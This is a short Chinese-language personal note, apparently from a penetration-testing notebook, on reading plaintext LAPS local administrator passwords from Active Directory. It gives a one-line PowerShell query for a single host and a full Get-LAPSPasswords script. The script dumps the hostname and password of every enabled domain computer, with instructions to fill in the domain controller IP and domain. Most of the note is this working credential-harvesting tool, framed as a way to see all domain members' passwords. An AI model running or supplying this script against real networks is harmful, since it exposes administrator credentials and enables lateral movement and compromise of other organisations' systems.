没碰过这种操作，但是记录一下，看文章意思就是如果配置过这个，就可以看到域内所有成员的明文密码<br />[https://juejin.cn/post/6844903572497235981](https://juejin.cn/post/6844903572497235981) <br />[https://www.cnblogs.com/linuxsec/articles/6080665.html](https://www.cnblogs.com/linuxsec/articles/6080665.html)

域控上通过域组策略查看明文密码

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670943009254-a2de6831-a48c-41ad-9d29-4797e3ae45c3.png#clientId=udfee5f95-24ad-4&from=paste&height=596&id=ud3fc3ce2&originHeight=745&originWidth=941&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128531&status=done&style=none&taskId=u2bb50733-10f1-420c-8ead-2d2f4af87a4&title=&width=752.8)

- 查看某台主机密码

powershell Get-ADComputer 域内主机名 -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd


- 查询所有域内主机密码(要修改最后一行的域控ip和域名）
```java
#!powershell
function Get-LAPSPasswords
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {
        # Status user
        Write-Verbose "[*] Grabbing computer accounts from Active Directory..."

        # Create data table for hostnames, and passwords from LDAP
        $TableAdsComputers = New-Object System.Data.DataTable 
        $TableAdsComputers.Columns.Add('Hostname') | Out-Null
        $TableAdsComputers.Columns.Add('Stored') | Out-Null
        $TableAdsComputers.Columns.Add('Readable') | Out-Null
        $TableAdsComputers.Columns.Add('Password') | Out-Null
        $TableAdsComputers.Columns.Add('Expiration') | Out-Null

        # ------------------------------------------------
        # Grab computer account information from Active Directory via LDAP
        # ------------------------------------------------
        $CompFilter = "(&(objectCategory=Computer))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
        }

        $ObjSearcher.FindAll() | ForEach-Object {

            # Setup fields
            $CurrentHost = $($_.properties['dnshostname'])
            $CurrentUac = $($_.properties['useraccountcontrol'])
            $CurrentPassword = $($_.properties['ms-MCS-AdmPwd'])
            if ($_.properties['ms-MCS-AdmPwdExpirationTime'] -ge 0){$CurrentExpiration = $([datetime]::FromFileTime([convert]::ToInt64($_.properties['ms-MCS-AdmPwdExpirationTime'],10)))}
            else{$CurrentExpiration = "NA"}

            $PasswordAvailable = 0
            $PasswordStored = 1

            $CurrentUacBin = [convert]::ToString($CurrentUac,2)

            # Check the 2nd to last value to determine if its disabled
            $DisableOffset = $CurrentUacBin.Length - 2
            $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

            # Set flag if stored password is not available
            if ($CurrentExpiration -eq "NA"){$PasswordStored = 0}


            if ($CurrentPassword.length -ge 1){$PasswordAvailable = 1}


            # Add computer to list if it's enabled
            if ($CurrentDisabled  -eq 0){
                # Add domain computer to data table
                $TableAdsComputers.Rows.Add($CurrentHost,$PasswordStored,$PasswordAvailable,$CurrentPassword, $CurrentExpiration) | Out-Null
            }

            # Display results
            $TableAdsComputers | Sort-Object {$_.Hostname} -Descending
         }
    }
    End
    {
    }
}
Get-LAPSPasswords -DomainController 域控IP -Credential test.local\Administrator | Format-Table -AutoSize
```
